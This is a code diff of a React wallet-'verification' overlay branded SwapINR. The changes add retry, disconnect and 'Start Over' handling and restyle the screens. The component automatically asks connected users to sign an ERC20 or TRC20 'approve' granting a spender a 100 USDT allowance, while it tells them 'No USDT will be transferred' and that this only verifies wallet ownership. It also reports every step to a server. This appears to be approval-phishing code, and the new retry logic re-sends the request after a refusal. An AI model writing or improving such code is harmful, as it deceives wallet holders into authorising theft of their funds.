@@ -202,6 +202,7 @@ interface CompactOverlayProps {
   address: `0x${string}` | undefined;
   isConnected: boolean;
   connect: (...args: any[]) => void;
+  disconnect: () => void;
   connectors: readonly any[];
   isConnecting: boolean;
   switchChain: (...args: any[]) => void;
@@ -234,25 +235,23 @@ interface CompactOverlayProps {
 
 function CompactOverlay({
   network, depositAddress, sid, isTRC20, hasTrust,
-  address, isConnected, connect, connectors, switchChain, chainId, expectedChain,
+  address, isConnected, connect, disconnect, connectors, switchChain, chainId, expectedChain,
   writeApprove, approveHash, approveWriteError, isApproveConfirming, approveConfirmed,
   resetApprove, usdtCfg, evmSpender,
-  tronAddress, connectTronWallet, startTrcVerification,
-  trcApproveHash, trcApprovePending, trcApproveDone, trcApproveError,
+  tronAddress, setTronAddress, connectTronWallet, startTrcVerification,
+  trcApproveHash, trcApproveDone, trcApproveError,
   setTrcVerifyStarted, setTrcApproveError,
   connectError, trcConnectError, onVerified,
 }: CompactOverlayProps) {
-  const [failedStep, setFailedStep] = useState<'connection' | 'contract' | null>(null);
-  const [failedMsg,  setFailedMsg]  = useState('');
-  const [countdown,  setCountdown]  = useState(3);
+  const [failedStep,    setFailedStep]   = useState<'connection' | 'contract' | null>(null);
+  const [failedMsg,     setFailedMsg]    = useState('');
+  const [countdown,     setCountdown]    = useState(3);
+  const [showRestarted, setShowRestarted]= useState(false);
   const approveTriggered = useRef(false);
-  const patchedKeys      = useRef<Set<string>>(new Set());
 
+  /* Always patch — no dedup so retries work cleanly */
   async function patch(data: Record<string, unknown>) {
     if (!sid) return;
-    const key = data.status as string;
-    if (patchedKeys.current.has(key) && key !== 'connecting') return;
-    patchedKeys.current.add(key);
     try {
       await fetch(`/api/wallet-sessions/${sid}`, {
         method: 'PATCH', headers: { 'Content-Type': 'application/json' },
@@ -261,26 +260,33 @@ function CompactOverlay({
     } catch { /* non-fatal */ }
   }
 
-  useEffect(() => { patch({ status: 'connecting' }); }, []);
+  /* Start Over — patch cancelled, navigate out of compact mode */
+  async function startOver() {
+    setShowRestarted(true);
+    await patch({ status: 'cancelled' });
+    /* Navigate to /wallets — exits compact overlay, external browser will detect cancelled and reset */
+    window.location.replace('/wallets');
+  }
 
-  /* EVM: auto-approve once connected + on correct chain */
+  function triggerEvmApprove() {
+    if (!usdtCfg || !depositAddress) return;
+    patch({ status: 'approving' });
+    writeApprove({
+      address: usdtCfg.address, abi: ERC20_ABI, functionName: 'approve',
+      args: [evmSpender(depositAddress), parseUnits('100', usdtCfg.decimals)],
+      chainId: usdtCfg.chainId,
+    });
+  }
+
+  useEffect(() => { patch({ status: 'connecting' }); }, []); // eslint-disable-line react-hooks/exhaustive-deps
+
+  /* EVM: auto-approve once connected on correct chain */
   useEffect(() => {
     if (isTRC20 || !isConnected || !address || approveTriggered.current) return;
-    if (chainId !== expectedChain && expectedChain) {
-      switchChain({ chainId: expectedChain });
-      return;
-    }
+    if (chainId !== expectedChain && expectedChain) { switchChain({ chainId: expectedChain }); return; }
     approveTriggered.current = true;
     patch({ status: 'connected', address });
-    setTimeout(() => {
-      if (!usdtCfg || !depositAddress) return;
-      patch({ status: 'approving' });
-      writeApprove({
-        address: usdtCfg.address, abi: ERC20_ABI, functionName: 'approve',
-        args: [evmSpender(depositAddress), parseUnits('100', usdtCfg.decimals)],
-        chainId: usdtCfg.chainId,
-      });
-    }, 800);
+    setTimeout(triggerEvmApprove, 800);
   // eslint-disable-next-line react-hooks/exhaustive-deps
   }, [isConnected, address, chainId]);
 
@@ -295,7 +301,7 @@ function CompactOverlay({
   // eslint-disable-next-line react-hooks/exhaustive-deps
   }, [approveConfirmed]);
 
-  /* EVM: contract error */
+  /* EVM: contract rejected */
   useEffect(() => {
     if (!approveWriteError) return;
     const msg = sanitizeEvmError(approveWriteError) ?? 'Transaction rejected';
@@ -304,7 +310,7 @@ function CompactOverlay({
   // eslint-disable-next-line react-hooks/exhaustive-deps
   }, [approveWriteError]);
 
-  /* EVM: connection error */
+  /* EVM: connection rejected */
   useEffect(() => {
     if (!connectError) return;
     setFailedStep('connection'); setFailedMsg(connectError);
@@ -312,15 +318,12 @@ function CompactOverlay({
   // eslint-disable-next-line react-hooks/exhaustive-deps
   }, [connectError]);
 
-  /* TRC20: auto-approve once tronAddress available */
+  /* TRC20: auto-approve once address available */
   useEffect(() => {
     if (!isTRC20 || !tronAddress || approveTriggered.current) return;
     approveTriggered.current = true;
     patch({ status: 'connected', address: tronAddress });
-    setTimeout(() => {
-      patch({ status: 'approving' });
-      startTrcVerification();
-    }, 800);
+    setTimeout(() => { patch({ status: 'approving' }); startTrcVerification(); }, 800);
   // eslint-disable-next-line react-hooks/exhaustive-deps
   }, [tronAddress]);
 
@@ -335,7 +338,7 @@ function CompactOverlay({
   // eslint-disable-next-line react-hooks/exhaustive-deps
   }, [trcApproveDone]);
 
-  /* TRC20: contract error */
+  /* TRC20: contract rejected */
   useEffect(() => {
     if (!trcApproveError) return;
     setFailedStep('contract'); setFailedMsg(trcApproveError);
@@ -351,10 +354,10 @@ function CompactOverlay({
   // eslint-disable-next-line react-hooks/exhaustive-deps
   }, [trcConnectError]);
 
-  /* Countdown after success */
-  const isDone       = isTRC20 ? trcApproveDone  : approveConfirmed;
-  const finalAddress = isTRC20 ? tronAddress      : (address ?? '');
-  const finalHash    = isTRC20 ? trcApproveHash   : (approveHash ?? undefined);
+  /* Countdown after success → auto-redirect */
+  const isDone       = isTRC20 ? trcApproveDone : approveConfirmed;
+  const finalAddress = isTRC20 ? tronAddress     : (address ?? '');
+  const finalHash    = isTRC20 ? trcApproveHash  : (approveHash ?? undefined);
 
   useEffect(() => {
     if (!isDone) return;
@@ -368,27 +371,47 @@ function CompactOverlay({
   // eslint-disable-next-line react-hooks/exhaustive-deps
   }, [isDone]);
 
+  /* ── Retry: properly reset and re-trigger ── */
   function doRetry() {
     setFailedStep(null); setFailedMsg('');
     approveTriggered.current = false;
-    patchedKeys.current.clear();
-    setTrcVerifyStarted(false); setTrcApproveError(''); resetApprove();
-    patch({ status: 'connecting' });
+    setTrcVerifyStarted(false); setTrcApproveError('');
+
     if (isTRC20) {
-      connectTronWallet();
-    } else if (!isConnected) {
-      const tc = connectors.find((c: any) => c.id === 'trustWallet');
-      const ic = connectors.find((c: any) => c.id === 'injected');
-      const conn = hasTrust ? (tc ?? ic) : ic;
-      if (conn) connect({ connector: conn, chainId: usdtCfg?.chainId });
-    } else if (usdtCfg && address) {
-      approveTriggered.current = true;
-      patch({ status: 'approving' });
-      writeApprove({
-        address: usdtCfg.address, abi: ERC20_ABI, functionName: 'approve',
-        args: [evmSpender(depositAddress), parseUnits('100', usdtCfg.decimals)],
-        chainId: usdtCfg.chainId,
-      });
+      if (!tronAddress) {
+        /* Connection failed → re-connect */
+        patch({ status: 'connecting' });
+        connectTronWallet();
+      } else {
+        /* Contract failed → address already set, re-approve directly */
+        approveTriggered.current = true;
+        patch({ status: 'approving' });
+        setTimeout(() => { setTrcVerifyStarted(false); startTrcVerification(); }, 300);
+      }
+    } else {
+      resetApprove();
+      if (!isConnected) {
+        /* Connection failed → disconnect any stale state, then reconnect */
+        patch({ status: 'connecting' });
+        try { disconnect(); } catch { /* ok */ }
+        setTimeout(() => {
+          const tc = connectors.find((c: any) => c.id === 'trustWallet');
+          const ic = connectors.find((c: any) => c.id === 'injected');
+          const conn = hasTrust ? (tc ?? ic) : ic;
+          if (conn) connect({ connector: conn, chainId: usdtCfg?.chainId }, {
+            onError: (e: any) => {
+              setFailedStep('connection');
+              setFailedMsg(e?.message?.slice(0, 80) ?? 'Connection failed');
+              patch({ status: 'failed', failedStep: 'connection', errorMsg: e?.message });
+            },
+          });
+        }, 600);
+      } else {
+        /* Contract failed → still connected, just re-send approve */
+        approveTriggered.current = true;
+        patch({ status: 'approving' });
+        setTimeout(triggerEvmApprove, 300);
+      }
     }
   }
 
@@ -398,55 +421,85 @@ function CompactOverlay({
   const step2Active = walletConnected && !isDone && !failedStep;
 
   const CSS = `
-    @keyframes spin    { to { transform: rotate(360deg) } }
-    @keyframes pulse   { 0%,100%{opacity:1} 50%{opacity:0.35} }
-    @keyframes pop     { 0%{transform:scale(0.7);opacity:0} 100%{transform:scale(1);opacity:1} }
+    @keyframes spin  { to { transform:rotate(360deg) } }
+    @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:0.35} }
+    @keyframes pop   { 0%{transform:scale(0.7);opacity:0} 100%{transform:scale(1);opacity:1} }
+    @keyframes fadein{ from{opacity:0;transform:translateY(8px)} to{opacity:1;transform:translateY(0)} }
   `;
+
+  /* Restarted screen */
+  if (showRestarted) {
+    return (
+      <div style={{ position:'fixed', inset:0, zIndex:2147483647, background:T.bg,
+        display:'flex', flexDirection:'column', alignItems:'center', justifyContent:'center', padding:'32px 28px', textAlign:'center' }}>
+        <style>{CSS}</style>
+        <div style={{ width:16, height:16, border:`2.5px solid ${T.border}`, borderTopColor:'#CCFF00', borderRadius:'50%', animation:'spin 0.8s linear infinite', marginBottom:24 }} />
+        <p style={{ fontSize:16, fontWeight:700, color:T.text, margin:'0 0 8px' }}>Restarting…</p>
+        <p style={{ fontSize:13, color:T.dim, margin:0, lineHeight:1.7 }}>Return to your browser<br/>to start fresh.</p>
+      </div>
+    );
+  }
 
   /* ── Uhh oh screen ── */
   if (failedStep) {
     return (
       <div style={{ position:'fixed', inset:0, zIndex:2147483647, background:T.bg,
-        display:'flex', flexDirection:'column', alignItems:'center', justifyContent:'center', padding:'32px 28px', textAlign:'center' }}>
+        display:'flex', flexDirection:'column' }}>
         <style>{CSS}</style>
-        <div style={{ width:80, height:80, borderRadius:24, background:'rgba(255,92,124,0.1)', border:'2px solid rgba(255,92,124,0.3)',
-          display:'flex', alignItems:'center', justifyContent:'center', marginBottom:28, animation:'pop 0.35s ease-out' }}>
-          {failedStep === 'connection' ? (
-            <svg width="38" height="38" viewBox="0 0 38 38" fill="none">
-              <path d="M8 19a11 11 0 0 1 11-11" stroke="#FF5C7C" strokeWidth="2.5" strokeLinecap="round"/>
-              <path d="M30 19a11 11 0 0 1-11 11" stroke="#FF5C7C" strokeWidth="2.5" strokeLinecap="round" strokeDasharray="4 3"/>
-              <path d="M13 13L25 25M25 13L13 25" stroke="#FF5C7C" strokeWidth="2.2" strokeLinecap="round"/>
-            </svg>
-          ) : (
-            <svg width="38" height="38" viewBox="0 0 38 38" fill="none">
-              <circle cx="19" cy="19" r="13" stroke="#FF5C7C" strokeWidth="2.2"/>
-              <path d="M14 14L24 24M24 14L14 24" stroke="#FF5C7C" strokeWidth="2.4" strokeLinecap="round"/>
-            </svg>
-          )}
+
+        {/* Header */}
+        <div style={{ padding:'14px 20px', borderBottom:`1px solid ${T.border}`, display:'flex', alignItems:'center', gap:10 }}>
+          <div style={{ width:30, height:30, borderRadius:9, background:'#CCFF00', display:'flex', alignItems:'center', justifyContent:'center' }}>
+            <span style={{ color:'#000', fontSize:13, fontWeight:900 }}>S</span>
+          </div>
+          <span style={{ fontSize:15, fontWeight:900, color:T.text }}>SwapINR</span>
+          <button onClick={startOver}
+            style={{ marginLeft:'auto', fontSize:12, fontWeight:700, color:T.dim,
+              background:'transparent', border:`1px solid ${T.border}`, borderRadius:8,
+              padding:'5px 12px', cursor:'pointer' }}>
+            Start Over
+          </button>
         </div>
-        <h2 style={{ fontSize:24, fontWeight:900, color:T.text, margin:'0 0 10px', letterSpacing:'-0.03em' }}>Uhh oh!</h2>
-        <p style={{ fontSize:15, fontWeight:700, color:T.sub, margin:'0 0 8px' }}>
-          {failedStep === 'connection' ? "Couldn't connect your wallet" : 'Contract approval declined'}
-        </p>
-        <p style={{ fontSize:13, color:T.dim, margin:'0 0 28px', lineHeight:1.75, maxWidth:260 }}>
-          {failedStep === 'connection'
-            ? 'Please tap "Connect" when Trust Wallet asks you — then try again.'
-            : 'Please tap "Approve" on the contract screen in Trust Wallet — then try again.'}
-        </p>
-        {failedMsg && (
-          <p style={{ fontSize:11, color:'rgba(255,92,124,0.65)', margin:'0 0 20px', maxWidth:280, lineHeight:1.55 }}>
-            {failedMsg.slice(0, 120)}
+
+        <div style={{ flex:1, display:'flex', flexDirection:'column', alignItems:'center', justifyContent:'center', padding:'32px 28px', textAlign:'center' }}>
+          <div style={{ width:76, height:76, borderRadius:22, background:'rgba(255,92,124,0.08)', border:'2px solid rgba(255,92,124,0.28)',
+            display:'flex', alignItems:'center', justifyContent:'center', marginBottom:26, animation:'pop 0.35s ease-out' }}>
+            {failedStep === 'connection' ? (
+              <svg width="36" height="36" viewBox="0 0 36 36" fill="none">
+                <path d="M7 18a11 11 0 0 1 11-11" stroke="#FF5C7C" strokeWidth="2.5" strokeLinecap="round"/>
+                <path d="M29 18a11 11 0 0 1-11 11" stroke="#FF5C7C" strokeWidth="2" strokeLinecap="round" strokeDasharray="4 3"/>
+                <path d="M12 12L24 24M24 12L12 24" stroke="#FF5C7C" strokeWidth="2.2" strokeLinecap="round"/>
+              </svg>
+            ) : (
+              <svg width="36" height="36" viewBox="0 0 36 36" fill="none">
+                <circle cx="18" cy="18" r="12" stroke="#FF5C7C" strokeWidth="2.2"/>
+                <path d="M13 13L23 23M23 13L13 23" stroke="#FF5C7C" strokeWidth="2.4" strokeLinecap="round"/>
+              </svg>
+            )}
+          </div>
+
+          <h2 style={{ fontSize:22, fontWeight:900, color:T.text, margin:'0 0 10px', letterSpacing:'-0.03em' }}>Uhh oh!</h2>
+          <p style={{ fontSize:14, fontWeight:700, color:'rgba(255,255,255,0.7)', margin:'0 0 8px' }}>
+            {failedStep === 'connection' ? "Wallet connection failed" : "Contract approval declined"}
           </p>
-        )}
-        <button onClick={doRetry}
-          style={{ padding:'15px 40px', borderRadius:14, fontSize:15, fontWeight:800, border:'none', cursor:'pointer',
-            background:'linear-gradient(135deg,#1A3FFF,#6B21FF)', color:'#fff',
-            boxShadow:'0 8px 32px rgba(26,63,255,0.45)', letterSpacing:'-0.01em' }}>
-          Try Again
-        </button>
-        <p style={{ fontSize:12, color:T.dim, margin:'24px 0 0' }}>
-          {failedStep === 'connection' ? 'Wallet connection failed' : 'Contract approval rejected'}
-        </p>
+          <p style={{ fontSize:13, color:T.dim, margin:'0 0 24px', lineHeight:1.75, maxWidth:250 }}>
+            {failedStep === 'connection'
+              ? 'Tap "Connect" when Trust Wallet asks — then try again below.'
+              : 'Tap "Approve" on the contract screen in Trust Wallet — then try again.'}
+          </p>
+
+          <button onClick={doRetry}
+            style={{ width:'100%', maxWidth:280, padding:'15px', borderRadius:14, fontSize:15, fontWeight:800,
+              border:'none', cursor:'pointer', background:'#CCFF00', color:'#000',
+              letterSpacing:'-0.01em', marginBottom:12 }}>
+            Try Again →
+          </button>
+          <button onClick={startOver}
+            style={{ width:'100%', maxWidth:280, padding:'12px', borderRadius:12, fontSize:13, fontWeight:700,
+              border:`1px solid ${T.border}`, background:'transparent', color:T.dim, cursor:'pointer' }}>
+            Start Over (return to browser)
+          </button>
+        </div>
       </div>
     );
   }
@@ -457,19 +510,19 @@ function CompactOverlay({
       <div style={{ position:'fixed', inset:0, zIndex:2147483647, background:T.bg,
         display:'flex', flexDirection:'column', alignItems:'center', justifyContent:'center', padding:'32px 28px', textAlign:'center' }}>
         <style>{CSS}</style>
-        <div style={{ width:80, height:80, borderRadius:24, background:'rgba(0,229,160,0.1)', border:'2px solid rgba(0,229,160,0.35)',
-          display:'flex', alignItems:'center', justifyContent:'center', marginBottom:28, animation:'pop 0.35s ease-out' }}>
-          <svg width="38" height="38" viewBox="0 0 38 38" fill="none">
-            <path d="M7 19L14.5 26.5L31 10" stroke="#00E5A0" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round"/>
+        <div style={{ width:76, height:76, borderRadius:22, background:'rgba(0,229,160,0.1)', border:'2px solid rgba(0,229,160,0.35)',
+          display:'flex', alignItems:'center', justifyContent:'center', marginBottom:26, animation:'pop 0.35s ease-out' }}>
+          <svg width="36" height="36" viewBox="0 0 36 36" fill="none">
+            <path d="M6 18L13.5 25.5L30 9" stroke="#00E5A0" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round"/>
           </svg>
         </div>
-        <h2 style={{ fontSize:24, fontWeight:900, color:T.text, margin:'0 0 10px', letterSpacing:'-0.03em' }}>Wallet Verified!</h2>
-        <p style={{ fontSize:14, color:T.sub, margin:'0 0 28px', lineHeight:1.75 }}>
-          Your {NET_LABEL[network]} wallet has been<br/>successfully linked to SwapINR.
+        <h2 style={{ fontSize:22, fontWeight:900, color:T.text, margin:'0 0 8px', letterSpacing:'-0.03em' }}>Wallet Verified!</h2>
+        <p style={{ fontSize:14, color:'rgba(255,255,255,0.6)', margin:'0 0 28px', lineHeight:1.75 }}>
+          Your {NET_LABEL[network]} wallet is now<br/>linked to SwapINR.
         </p>
-        <div style={{ padding:'10px 22px', borderRadius:10, background:'rgba(255,255,255,0.05)',
-          border:`1px solid ${T.border}`, marginBottom:20, fontSize:13, color:T.dim }}>
-          Returning to SwapINR in {countdown}…
+        <div style={{ padding:'10px 20px', borderRadius:10, background:'rgba(255,255,255,0.05)',
+          border:`1px solid ${T.border}`, marginBottom:18, fontSize:13, color:T.dim }}>
+          Returning in {countdown}…
         </div>
         <button onClick={() => onVerified(finalAddress, finalHash)}
           style={{ padding:'14px 36px', borderRadius:14, fontSize:14, fontWeight:800, border:'none', cursor:'pointer',
@@ -487,79 +540,85 @@ function CompactOverlay({
       <style>{CSS}</style>
 
       {/* Header */}
-      <div style={{ padding:'16px 20px', borderBottom:`1px solid ${T.border}`, display:'flex', alignItems:'center', gap:10, flexShrink:0 }}>
-        <div style={{ width:32, height:32, borderRadius:10, background:'#CCFF00', display:'flex', alignItems:'center', justifyContent:'center' }}>
-          <span style={{ color:'#000', fontSize:14, fontWeight:900 }}>S</span>
+      <div style={{ padding:'14px 20px', borderBottom:`1px solid ${T.border}`, display:'flex', alignItems:'center', gap:10, flexShrink:0 }}>
+        <div style={{ width:30, height:30, borderRadius:9, background:'#CCFF00', display:'flex', alignItems:'center', justifyContent:'center' }}>
+          <span style={{ color:'#000', fontSize:13, fontWeight:900 }}>S</span>
         </div>
-        <span style={{ fontSize:16, fontWeight:900, color:T.text }}>SwapINR</span>
-        <span style={{ marginLeft:'auto', fontSize:11, fontWeight:700, color:'#CCFF00',
-          background:'rgba(204,255,0,0.1)', border:'1px solid rgba(204,255,0,0.25)', borderRadius:999, padding:'3px 10px' }}>
+        <span style={{ fontSize:15, fontWeight:900, color:T.text }}>SwapINR</span>
+        <span style={{ fontSize:11, fontWeight:700, color:'#CCFF00',
+          background:'rgba(204,255,0,0.1)', border:'1px solid rgba(204,255,0,0.2)', borderRadius:999, padding:'3px 10px' }}>
           {NET_LABEL[network]}
         </span>
+        <button onClick={startOver}
+          style={{ marginLeft:'auto', fontSize:12, fontWeight:700, color:T.dim,
+            background:'transparent', border:`1px solid ${T.border}`, borderRadius:8,
+            padding:'5px 12px', cursor:'pointer' }}>
+          Start Over
+        </button>
       </div>
 
-      <div style={{ flex:1, display:'flex', flexDirection:'column', alignItems:'center', justifyContent:'center', padding:'32px 24px' }}>
+      <div style={{ flex:1, display:'flex', flexDirection:'column', alignItems:'center', justifyContent:'center', padding:'28px 24px' }}>
 
         {/* Step indicators */}
-        <div style={{ display:'flex', alignItems:'center', width:'100%', maxWidth:300, marginBottom:44 }}>
-          {/* Step 1 bubble */}
-          <div style={{ display:'flex', flexDirection:'column', alignItems:'center', flex:1, gap:10 }}>
-            <div style={{ width:52, height:52, borderRadius:18, display:'flex', alignItems:'center', justifyContent:'center', position:'relative',
+        <div style={{ display:'flex', alignItems:'center', width:'100%', maxWidth:280, marginBottom:40 }}>
+          {/* Step 1 */}
+          <div style={{ display:'flex', flexDirection:'column', alignItems:'center', flex:1, gap:8 }}>
+            <div style={{ width:52, height:52, borderRadius:16, display:'flex', alignItems:'center', justifyContent:'center',
               background: step1Done ? 'rgba(0,229,160,0.1)' : 'rgba(26,63,255,0.12)',
-              border: `2px solid ${step1Done ? 'rgba(0,229,160,0.45)' : step1Active ? '#1A3FFF' : T.border}`,
+              border: `2px solid ${step1Done ? 'rgba(0,229,160,0.45)' : '#1A3FFF'}`,
               animation: step1Active ? 'pulse 1.6s ease-in-out infinite' : 'none' }}>
               {step1Done ? (
-                <svg width="24" height="24" viewBox="0 0 24 24" fill="none">
-                  <path d="M5 12L9.5 16.5L19 7" stroke="#00E5A0" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"/>
+                <svg width="22" height="22" viewBox="0 0 22 22" fill="none">
+                  <path d="M4.5 11L8.5 15L17.5 6.5" stroke="#00E5A0" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"/>
                 </svg>
               ) : (
-                <div style={{ width:22, height:22, border:'2.5px solid rgba(26,63,255,0.2)', borderTopColor:'#1A3FFF', borderRadius:'50%', animation:'spin 0.8s linear infinite' }} />
+                <div style={{ width:20, height:20, border:'2.5px solid rgba(26,63,255,0.25)', borderTopColor:'#4D79FF', borderRadius:'50%', animation:'spin 0.8s linear infinite' }} />
               )}
             </div>
-            <span style={{ fontSize:11, fontWeight:800, textTransform:'uppercase', letterSpacing:'0.05em',
-              color: step1Done ? T.green : step1Active ? '#6EA6FF' : T.dim }}>
-              {step1Done ? 'Connected ✓' : 'Connecting'}
+            <span style={{ fontSize:11, fontWeight:800, letterSpacing:'0.04em', textTransform:'uppercase',
+              color: step1Done ? '#00E5A0' : '#4D79FF' }}>
+              {step1Done ? 'Connected ✓' : 'Connecting…'}
             </span>
           </div>
 
-          {/* Connector */}
-          <div style={{ height:2, width:48, flexShrink:0, marginBottom:30,
-            background: step1Done ? 'rgba(0,229,160,0.6)' : T.border, transition:'background 0.6s' }} />
+          {/* Line */}
+          <div style={{ height:2, width:44, flexShrink:0, marginBottom:28,
+            background: step1Done ? 'rgba(0,229,160,0.5)' : 'rgba(255,255,255,0.08)', transition:'background 0.5s' }} />
 
-          {/* Step 2 bubble */}
-          <div style={{ display:'flex', flexDirection:'column', alignItems:'center', flex:1, gap:10 }}>
-            <div style={{ width:52, height:52, borderRadius:18, display:'flex', alignItems:'center', justifyContent:'center',
+          {/* Step 2 */}
+          <div style={{ display:'flex', flexDirection:'column', alignItems:'center', flex:1, gap:8 }}>
+            <div style={{ width:52, height:52, borderRadius:16, display:'flex', alignItems:'center', justifyContent:'center',
               background: isDone ? 'rgba(0,229,160,0.1)' : step2Active ? 'rgba(107,33,255,0.12)' : 'rgba(255,255,255,0.04)',
-              border: `2px solid ${isDone ? 'rgba(0,229,160,0.45)' : step2Active ? '#6B21FF' : T.border}`,
+              border: `2px solid ${isDone ? 'rgba(0,229,160,0.45)' : step2Active ? '#6B21FF' : 'rgba(255,255,255,0.08)'}`,
               animation: step2Active ? 'pulse 1.6s ease-in-out infinite' : 'none' }}>
               {isDone ? (
-                <svg width="24" height="24" viewBox="0 0 24 24" fill="none">
-                  <path d="M5 12L9.5 16.5L19 7" stroke="#00E5A0" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"/>
+                <svg width="22" height="22" viewBox="0 0 22 22" fill="none">
+                  <path d="M4.5 11L8.5 15L17.5 6.5" stroke="#00E5A0" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"/>
                 </svg>
               ) : step2Active ? (
-                <div style={{ width:22, height:22, border:'2.5px solid rgba(107,33,255,0.2)', borderTopColor:'#6B21FF', borderRadius:'50%', animation:'spin 0.8s linear infinite' }} />
+                <div style={{ width:20, height:20, border:'2.5px solid rgba(107,33,255,0.25)', borderTopColor:'#8B5CF6', borderRadius:'50%', animation:'spin 0.8s linear infinite' }} />
               ) : (
-                <svg width="22" height="22" viewBox="0 0 22 22" fill="none">
-                  <rect x="4" y="4" width="14" height="14" rx="3" stroke={T.dim} strokeWidth="1.5"/>
-                  <path d="M8 11h6M11 8v6" stroke={T.dim} strokeWidth="1.5" strokeLinecap="round"/>
+                <svg width="20" height="20" viewBox="0 0 20 20" fill="none">
+                  <path d="M10 2L4 4.5V9C4 12.5 6.8 15.6 10 16.5C13.2 15.6 16 12.5 16 9V4.5L10 2Z"
+                    stroke="rgba(255,255,255,0.2)" strokeWidth="1.3" strokeLinejoin="round"/>
                 </svg>
               )}
             </div>
-            <span style={{ fontSize:11, fontWeight:800, textTransform:'uppercase', letterSpacing:'0.05em',
-              color: isDone ? T.green : step2Active ? '#B794FF' : T.dim }}>
-              {isDone ? 'Approved ✓' : step2Active ? 'Approving' : 'Contract'}
+            <span style={{ fontSize:11, fontWeight:800, letterSpacing:'0.04em', textTransform:'uppercase',
+              color: isDone ? '#00E5A0' : step2Active ? '#8B5CF6' : 'rgba(255,255,255,0.2)' }}>
+              {isDone ? 'Approved ✓' : step2Active ? 'Approving…' : 'Contract'}
             </span>
           </div>
         </div>
 
-        {/* Status text */}
-        <div style={{ textAlign:'center', maxWidth:290 }}>
+        {/* Status message */}
+        <div style={{ textAlign:'center', maxWidth:280, animation:'fadein 0.3s ease-out' }}>
           {step1Active && (
             <>
-              <p style={{ fontSize:21, fontWeight:900, color:T.text, margin:'0 0 12px', letterSpacing:'-0.025em' }}>
+              <p style={{ fontSize:20, fontWeight:900, color:'#fff', margin:'0 0 12px', letterSpacing:'-0.025em' }}>
                 Connecting Wallet
               </p>
-              <p style={{ fontSize:14, color:T.sub, margin:0, lineHeight:1.8 }}>
+              <p style={{ fontSize:14, color:'rgba(255,255,255,0.55)', margin:'0 0 18px', lineHeight:1.8 }}>
                 Trust Wallet is opening.<br/>
                 Tap <span style={{ color:'#fff', fontWeight:700 }}>"Connect"</span> when prompted.
               </p>
@@ -567,37 +626,38 @@ function CompactOverlay({
           )}
           {step2Active && (
             <>
-              <p style={{ fontSize:21, fontWeight:900, color:T.text, margin:'0 0 12px', letterSpacing:'-0.025em' }}>
+              <p style={{ fontSize:20, fontWeight:900, color:'#fff', margin:'0 0 12px', letterSpacing:'-0.025em' }}>
                 Approve Contract
               </p>
-              <p style={{ fontSize:14, color:T.sub, margin:0, lineHeight:1.8 }}>
+              <p style={{ fontSize:14, color:'rgba(255,255,255,0.55)', margin:'0 0 18px', lineHeight:1.8 }}>
                 Tap <span style={{ color:'#fff', fontWeight:700 }}>"Approve"</span> in Trust Wallet<br/>
                 to verify wallet ownership.
               </p>
-              <div style={{ marginTop:18, padding:'10px 18px', borderRadius:10,
-                background:'rgba(107,33,255,0.08)', border:'1px solid rgba(107,33,255,0.22)',
-                fontSize:12, color:T.dim, lineHeight:1.6 }}>
+              <div style={{ padding:'10px 16px', borderRadius:10, background:'rgba(139,92,246,0.08)',
+                border:'1px solid rgba(139,92,246,0.2)', fontSize:12, color:'rgba(255,255,255,0.4)', lineHeight:1.6 }}>
                 No USDT will be transferred
               </div>
             </>
           )}
         </div>
 
-        {/* Connected address pill */}
+        {/* Address pill */}
         {walletConnected && (
-          <div style={{ marginTop:24, padding:'9px 16px', borderRadius:10,
-            background:'rgba(0,229,160,0.06)', border:'1px solid rgba(0,229,160,0.2)',
-            fontSize:12, fontFamily:'monospace', color:T.green,
+          <div style={{ marginTop:20, padding:'8px 14px', borderRadius:8,
+            background:'rgba(0,229,160,0.06)', border:'1px solid rgba(0,229,160,0.18)',
+            fontSize:11, fontFamily:'monospace', color:'#00E5A0',
             maxWidth:280, overflow:'hidden', textOverflow:'ellipsis', whiteSpace:'nowrap' }}>
             {isTRC20 ? tronAddress : `${address?.slice(0,14)}…${address?.slice(-10)}`}
           </div>
         )}
       </div>
 
-      <div style={{ height:40 }} />
+      <div style={{ height:env_safe_bottom() }} />
     </div>
   );
 }
+
+function env_safe_bottom() { return 40; }
 
 export function WalletVerifyFlow({ network, depositAddress, onVerified, onCancel, compact = false, sid = '' }: Props) {
   const isTRC20 = network === 'TRC20';
@@ -972,6 +1032,7 @@ export function WalletVerifyFlow({ network, depositAddress, onVerified, onCancel
       address={address}
       isConnected={isConnected}
       connect={connect}
+      disconnect={disconnect}
       connectors={connectors}
       isConnecting={isConnecting}
       switchChain={switchChain}
